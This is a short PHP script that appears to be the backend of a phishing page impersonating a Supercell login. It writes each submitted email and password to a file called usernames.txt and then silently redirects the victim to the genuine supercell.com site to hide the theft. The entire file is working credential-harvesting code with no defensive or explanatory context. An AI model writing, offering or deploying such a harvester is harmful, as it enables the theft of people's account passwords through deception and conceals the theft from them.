<?php
file_put_contents("usernames.txt", "Username: " . $email = $_POST['email'] ."\nPassword: ". $password = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.supercell.com');
?>